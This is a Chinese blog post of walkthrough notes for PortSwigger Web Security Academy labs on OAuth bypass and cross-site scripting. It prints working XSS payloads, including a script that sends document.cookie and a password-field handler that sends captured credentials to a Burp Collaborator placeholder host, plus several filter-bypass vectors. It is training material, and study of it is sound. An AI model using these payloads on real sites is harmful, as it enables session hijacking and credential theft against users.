<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Burpsuite-Client | css_0k的博客</title><meta name="keywords" content="Burpsuite靶场,客户端漏洞"><meta name="author" content="css_0k"><meta name="copyright" content="css_0k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="OAuth2.0身份验证漏洞1.通过0Auth隐式流程绕过身份验证很简单，只需要抓包将登录内容修改即可   XSS[Cross-site scripting]三种最流行、最强大的利用场景： 利用xss窃取用户的cookie  窃取cookie1234567&lt;script&gt;     fetch(&amp;#x27;https:&#x2F;&#x2F;BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;">
<meta property="og:type" content="article">
<meta property="og:title" content="Burpsuite-Client">
<meta property="og:url" content="https://css0k.github.io/2023/03/10/Burpsuite-Client/index.html">
<meta property="og:site_name" content="css_0k的博客">
<meta property="og:description" content="OAuth2.0身份验证漏洞1.通过0Auth隐式流程绕过身份验证很简单，只需要抓包将登录内容修改即可   XSS[Cross-site scripting]三种最流行、最强大的利用场景： 利用xss窃取用户的cookie  窃取cookie1234567&lt;script&gt;     fetch(&amp;#x27;https:&#x2F;&#x2F;BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/12112613631567912103.jpg">
<meta property="article:published_time" content="2023-03-10T00:39:38.000Z">
<meta property="article:modified_time" content="2023-05-18T15:50:52.855Z">
<meta property="article:author" content="css_0k">
<meta property="article:tag" content="Burpsuite靶场">
<meta property="article:tag" content="客户端漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/12112613631567912103.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://css0k.github.io/2023/03/10/Burpsuite-Client/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Burpsuite-Client',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-18 23:50:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929211155.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://css0k-1308151975.cos.ap-beijing.myqcloud.com/12112613631567912103.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">css_0k的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Burpsuite-Client</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-10T00:39:38.000Z" title="Created 2023-03-10 08:39:38">2023-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-05-18T15:50:52.855Z" title="Updated 2023-05-18 23:50:52">2023-05-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Burpsuite-Client"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="OAuth2-0身份验证漏洞"><a href="#OAuth2-0身份验证漏洞" class="headerlink" title="OAuth2.0身份验证漏洞"></a>OAuth2.0身份验证漏洞</h1><h3 id="1-通过0Auth隐式流程绕过身份验证"><a href="#1-通过0Auth隐式流程绕过身份验证" class="headerlink" title="1.通过0Auth隐式流程绕过身份验证"></a>1.通过0Auth隐式流程绕过身份验证</h3><p>很简单，只需要抓包将登录内容修改即可</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222140405478.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222140551360.png" alt="image-20230222140551360"></p>
<h1 id="XSS-Cross-site-scripting"><a href="#XSS-Cross-site-scripting" class="headerlink" title="XSS[Cross-site scripting]"></a>XSS<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">[Cross-site scripting]</a></h1><h2 id="三种最流行、最强大的利用场景："><a href="#三种最流行、最强大的利用场景：" class="headerlink" title="三种最流行、最强大的利用场景："></a>三种最流行、最强大的利用场景：</h2><ul>
<li>利用xss窃取用户的cookie</li>
</ul>
<h3 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, </span></span><br><span class="line"><span class="javascript">          &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, </span></span><br><span class="line"><span class="javascript">           <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, </span></span><br><span class="line"><span class="javascript">           <span class="attr">body</span>:<span class="built_in">document</span>.cookie &#125;</span></span><br><span class="line"><span class="javascript">         );</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210160534982.png" alt="image-20221210160534982"></p>
<p>将cookie替换成带出的这个，就可以成功模拟用户</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210160042940.png" alt="image-20221210160042940"></p>
<ul>
<li>利用xss读取自动填充的密码</li>
</ul>
<h3 id="获取自动填充密码"><a href="#获取自动填充密码" class="headerlink" title="获取自动填充密码"></a>获取自动填充密码</h3><p>需要监控输入框的变化，所以我们引入了onchange事件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">	method:&#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">	mode: &#x27;no-cors&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">	body:username.value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">	&#125;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210164718472.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210164936524.png" alt="image-20221210164936524"></p>
<ul>
<li>利用xss执行CSRF漏洞  </li>
</ul>
<h3 id="执行CSRF"><a href="#执行CSRF" class="headerlink" title="执行CSRF"></a>执行CSRF</h3><p>一些网站允许登录用户更改他们的电子邮件地址而无需重新输入密码。如果您发现了 XSS 漏洞，您可以让它触发此功能，将受害者的电子邮件地址更改为您控制的地址，然后触发密码重置以获得对该帐户的访问权限。</p>
<h4 id="LAB-利用xss执行CSRF"><a href="#LAB-利用xss执行CSRF" class="headerlink" title="LAB: 利用xss执行CSRF"></a>LAB: 利用xss执行CSRF</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310162645809.png" alt="image-20230310162645809"></p>
<h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>题目：将 XSS 反射到 HTML 上下文中，不进行任何编码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/t017af6c064a82629f8.png" alt="img"></p>
<p>先看一下利用点 </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141922676.png" alt="image-20221207141922676"></p>
<p>可以看到我们输入的111直接被嵌入html代码中，这样便可以进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141623688.png" alt="image-20221207141623688"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141749569.png" alt="image-20221207141749569"></p>
<h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h3><p>题目：将 XSS 存储到 HTML 上下文中，不进行任何编码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142231268.png" alt="image-20221207142231268"></p>
<p>题目描述中说明了XSS点是在评论区，这个过程真实情况中应该是我们自己测一下    </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142413780.png" alt="image-20221207142413780"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142708794.png" alt="image-20221207142708794"></p>
<p>可以看到这种XSS漏洞是直接将将输入嵌入html编码  并且可以存储在该页面</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142841287.png" alt="image-20221207142841287"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142935863.png" alt="image-20221207142935863"></p>
<p>因此当我们之后访问该网站的时候  经过浏览器对html编码的渲染  就会触发我们输入的恶意代码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207143038224.png" alt="image-20221207143038224"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207143437755.png" alt="image-20221207143437755"></p>
<h3 id="反射型和存储型的区别"><a href="#反射型和存储型的区别" class="headerlink" title="反射型和存储型的区别"></a>反射型和存储型的区别</h3><p>虽然两种XSS都会将接收的数据映射到响应中，但是入口点不同，存储型的入口点是数据库，反射型的入口点是HTTP请求</p>
<p>反射型是在请求响应的时候会触发，而存储型实际上是在访问该存储xss代码的网页时html渲染所致</p>
<h3 id="3-基于DOM型XSS-location-search-gt-document-write"><a href="#3-基于DOM型XSS-location-search-gt-document-write" class="headerlink" title="3.基于DOM型XSS: location.search-&gt;document.write"></a>3.基于DOM型XSS: location.search-&gt;document.write</h3><p><strong>DOM有一个source和sink，可以理解为DOM操作函数的入口点和出口点，基于DOM的XSS就是因为将入口点的输入传递给出口点的时候被出口点函数执行导致的XSS。常见的source就是URL了，搭配window.location对象访问操作sink触发。</strong></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207144437755.png" alt="image-20221207144437755"></p>
<p>拼接也无果</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207145241700.png" alt="image-20221207145241700"></p>
<p>能否成功利用基于DOM的XSS还是要看source和sink是否搭配，这是一个组合的问题</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207191215516.png" alt="image-20221207191215516"></p>
<p>上面模拟了一个利用document.write进行写参</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205136689.png" alt="image-20221208205136689"></p>
<p>window.location 对象所包含的属性</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">hash</td>
<td align="left">从井号 (#) 开始的 URL（锚）</td>
</tr>
<tr>
<td align="left">host</td>
<td align="left">主机名和当前 URL 的端口号</td>
</tr>
<tr>
<td align="left">hostname</td>
<td align="left">当前 URL 的主机名</td>
</tr>
<tr>
<td align="left">href</td>
<td align="left">完整的 URL</td>
</tr>
<tr>
<td align="left">pathname</td>
<td align="left">当前 URL 的路径部分</td>
</tr>
<tr>
<td align="left">port</td>
<td align="left">当前 URL 的端口号</td>
</tr>
<tr>
<td align="left">protocol</td>
<td align="left">当前 URL 的协议</td>
</tr>
<tr>
<td align="left">search</td>
<td align="left">从问号 (?) 开始的 URL（查询部分）</td>
</tr>
</tbody></table>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205627982.png" alt="image-20221208205627982"></p>
<p>说明<code>query</code>这个是获取参数search的值</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205804470.png" alt="image-20221208205804470"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205037414.png" alt="image-20221208205037414"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br><span class="line">    </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208211027630.png" alt="image-20221208211027630"></p>
<h3 id="4-基于DOM型XSS-location-search-gt-innerHTML"><a href="#4-基于DOM型XSS-location-search-gt-innerHTML" class="headerlink" title="4.基于DOM型XSS: location.search-&gt;innerHTML"></a>4.基于DOM型XSS: location.search-&gt;innerHTML</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208214923004.png" alt="image-20221208214923004"></p>
<p>可以发现innerHTML不支持script和svg标签</p>
<p>能发现innerHTML直接将query值 也就是search传入 嵌入html代码中</p>
<p>所以可以直接嵌入标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208215146751.png" alt="image-20221208215146751"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208215336310.png" alt="image-20221208215336310"></p>
<h3 id="5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="5.DOM XSS in jQuery anchor href attribute sink using location.search source"></a>5.DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h3><p>测试发现 returnPath 的值就是点击back返回的地址</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220150142.png" alt="image-20221208220150142"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220310268.png"></p>
<p>测试闭合  发现成功了呜呜</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220509171.png" alt="image-20221208220509171"></p>
<p>但当测试cookie的时候失败了  说明这样只是self xss   没有本质的用途</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/1706496-20200523141748897-1961227083.png" alt="img"></p>
<p>修改的是<code>href</code>标签：用JS伪协议</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure>

<h4 id="LAB-使用-hashchange-事件的-jQuery-选择器接收器中的-DOM-XSS"><a href="#LAB-使用-hashchange-事件的-jQuery-选择器接收器中的-DOM-XSS" class="headerlink" title="LAB: 使用 hashchange 事件的 jQuery 选择器接收器中的 DOM XSS"></a>LAB: 使用 hashchange 事件的 jQuery 选择器接收器中的 DOM XSS</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315170634888.png" alt="image-20230315170634888"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span></span><br><span class="line">$(window).on(&#x27;hashchange&#x27;, function ()&#123;</span><br><span class="line">	var post = $(&#x27;section.blog-list h2:contains(&#x27; + decodeURIComponent(window.location.hash.slice(1)) + &#x27;)&#x27;);</span><br><span class="line">    if (post) post.get(0).scrollIntoView();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">scirpt</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316002153274.png" alt="image-20230316002153274"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316002411076.png" alt="image-20230316002411076"></p>
<h4 id="LAB-将-XSS-反射到带有尖括号的-HTML-编码的属性中"><a href="#LAB-将-XSS-反射到带有尖括号的-HTML-编码的属性中" class="headerlink" title="LAB: 将 XSS 反射到带有尖括号的 HTML 编码的属性中"></a>LAB: 将 XSS 反射到带有尖括号的 HTML 编码的属性中</h4><p>这里进行了 &lt; 的过滤  明显是HTML实体编码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316003001965.png" alt="image-20230316003001965"></p>
<p>尝试闭合属性来构造</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316003306226.png" alt="image-20230316003306226"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316003622932.png" alt="image-20230316003622932"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316003425049.png" alt="image-20230316003425049"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316003515607.png" alt="image-20230316003515607"></p>
<p><strong>在测试反射xss和存储xss时，一个关键的任务就是要注意xss的上下文</strong></p>
<p><strong>xss上下文：攻击者控制的数据出现的位置</strong>。</p>
<ul>
<li>响应中出现攻击者可控数据的位置。</li>
<li>应用程序对该数据执行的任何输入验证或其他处理。</li>
</ul>
<h2 id="HTML标签之间的XSS"><a href="#HTML标签之间的XSS" class="headerlink" title="HTML标签之间的XSS"></a>HTML标签之间的XSS</h2><p>当 XSS 上下文是 HTML 标签之间的文本时，您需要引入一些新的 HTML 标签来触发 JavaScript 的执行。</p>
<p>一些有用的执行 JavaScript 的方法是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="LAB-将XSS反映到HTML上下文中，大多数标签和属性被阻止"><a href="#LAB-将XSS反映到HTML上下文中，大多数标签和属性被阻止" class="headerlink" title="LAB: 将XSS反映到HTML上下文中，大多数标签和属性被阻止"></a>LAB: 将XSS反映到HTML上下文中，大多数标签和属性被阻止</h4><p>fuzz测试  探测还有那些标签没被禁用</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310165350926.png" alt="image-20230310165350926"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310165441167.png" alt="image-20230310165441167"></p>
<p>然后我们利用body标签继续进行测试可用的属性</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310165730802.png" alt="image-20230310165730802"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310170000197.png" alt="image-20230310170000197"></p>
<p>然后我们利用onresize属性进行xss</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a69006004bf09adc0a8dbad00b8002a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310170630143.png" alt="image-20230310170630143"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310170947560.png" alt="image-20230310170947560"></p>
<p>点击view exploit可以看到触发页面</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310170537124.png" alt="image-20230310170537124"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310171041793.png" alt="image-20230310171041793"></p>
<h4 id="LAB-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#LAB-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="LAB: Reflected XSS into HTML context with all tags blocked except custom ones"></a>LAB: Reflected XSS into HTML context with all tags blocked except custom ones</h4><p>此实验室阻止除自定义标记之外的所有 HTML 标记。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">location = <span class="string">&#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;解码后</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">location = <span class="string">&#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310172107937.png" alt="image-20230310172107937"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230310172123848.png" alt="image-20230310172123848"></p>
<h4 id="LAB-Reflected-XSS-with-event-handlers-and-href-attributes-blocked"><a href="#LAB-Reflected-XSS-with-event-handlers-and-href-attributes-blocked" class="headerlink" title="LAB: Reflected XSS with event handlers and href attributes blocked"></a>LAB: Reflected XSS with event handlers and href attributes blocked</h4><p>题目设置了一些白名单标签，并且禁用了所有的事件和锚点href属性</p>
<p>首先fuzz一下</p>
